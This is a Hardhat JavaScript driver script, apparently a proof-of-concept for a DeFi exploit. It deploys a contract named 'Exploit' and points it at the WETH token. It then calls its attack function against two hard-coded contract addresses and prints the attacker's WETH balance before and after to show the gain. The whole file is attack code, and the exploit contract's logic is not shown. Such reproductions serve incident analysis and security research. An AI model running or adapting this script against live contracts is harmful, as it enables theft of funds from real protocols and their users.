const hre = require("hardhat");
const {formatUnits} = require("ethers/lib/utils");

async function main() {
    const attacker = await hre.ethers.getSigner();

    const exploitContract = await hre.ethers.getContractFactory("Exploit");
    const exploit = await exploitContract.deploy();
    const WETH = await hre.ethers.getContractAt("IERC20","0xc02aaa39b223fe8d0a0e5c4f27ead9083c756cc2");
    await exploit.setUnderlying(WETH.address); //WETH

    console.log("Exploit contract deployed to:", exploit.address);
    console.log("WETH balance of attacker : %s",formatUnits(await WETH.balanceOf(attacker.address),await WETH.decimals()));
    const exploitTx = await exploit.attack("0x6b7a87899490ece95443e979ca9485cbe7e71522","0x7f4bae93c21b03836d20933ff55d9f77e5b8d34d");
    console.log("Exploiting... transcation: ",exploitTx.hash)
    await exploitTx.wait()
    console.log("Exploit complete.")
    console.log("WETH balance of attacker : %s",formatUnits(await WETH.balanceOf(attacker.address),await WETH.decimals()));

}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
